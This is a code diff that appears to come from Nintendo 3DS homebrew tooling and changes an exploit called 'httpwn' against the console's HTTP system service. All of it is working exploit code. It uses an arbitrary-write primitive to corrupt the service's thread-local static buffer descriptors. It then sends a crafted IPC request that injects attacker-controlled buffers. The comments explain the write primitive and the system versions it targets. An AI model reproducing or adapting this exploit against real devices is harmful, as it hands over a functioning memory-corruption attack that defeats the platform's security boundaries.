@@ -80,7 +80,8 @@ static Result doHttpwnArbwrite(u32 a, u32 b, u32 holePa, Handle srvHandle, Handl
 
 static u32 guessTargetTlsBase(void)
 {
-    // 3.0 (?) (4.2 guaranteed)-latest
+    // 4.0(?)-latest
+    // We only use this exploit for > 9.2, though
     s64 numKips = 0;
     svcGetSystemInfo(&numKips, 26, 0);
 
@@ -88,7 +89,7 @@ static u32 guessTargetTlsBase(void)
     return 0x1FFA0000 + (numKips < 6 ? 0x2000 : 0) + (IS_N3DS ? 0x1000 : 0);
 }
 
-Result httpwn(Handle *outHandle, u32 *outSelfSbufId, u32 *outAlignedBuffer, void *linearWorkbuf, void *hole, Handle gspHandle)
+Result httpwn(Handle *outHandle, u32 baseSbufId, void *linearWorkbuf, void *hole, const u32 *sbufs, u32 numSbufs, Handle gspHandle)
 {
     // hole must be in the middle of a LINEAR heap block
 
@@ -114,15 +115,22 @@ Result httpwn(Handle *outHandle, u32 *outSelfSbufId, u32 *outAlignedBuffer, void
 
     // Primitive is: *(a + 12) = b; *(b + 8) = a;
     // Write the static buffer descriptor (using an unaligned write) and buffer address.
-    *outSelfSbufId = 4;
+    u32 selfSbufId = baseSbufId; // needs to be >= 4!
     u32 targetTlsBase = guessTargetTlsBase();
-    u32 targetTlsArea = targetTlsBase + 0x180 + 8 * *outSelfSbufId;
+    u32 targetTlsArea = targetTlsBase + 0x180 + 8 * selfSbufId;
     TRY(doHttpwnArbwrite(targetTlsArea - 12, targetTlsArea + 2, holePa, srvHandle, gspHandle, httpServerHandle, linearWorkbuf)); // perfectly valid sbuf descriptor btw
     TRY(doHttpwnArbwrite(targetTlsArea + 4 - 12, targetTlsArea, holePa, srvHandle, gspHandle, httpServerHandle, linearWorkbuf));
 
     // We now have static buffer #4 covering its descriptor (tls+0x180+0x20), sz=0x40
+    // Inject our static buffers
+    // This rewrites the static buffer descriptor we're about to use
+    u32 *cmdbuf = getThreadCommandBuffer();
+    cmdbuf[0] = IPC_MakeHeader(0xDEAD, 0, 2);
+    cmdbuf[1] = IPC_Desc_StaticBuffer(8 * numSbufs, selfSbufId);
+    cmdbuf[2] = (u32)sbufs;
+    TRY(svcSendSyncRequest(httpServerHandle));
+
     *outHandle = httpServerHandle;
-    *outAlignedBuffer = targetTlsArea & ~0xFFF; // tls+0x00 is unused, AFAIK
 
     // Let things leak, we don't really care
     return res;
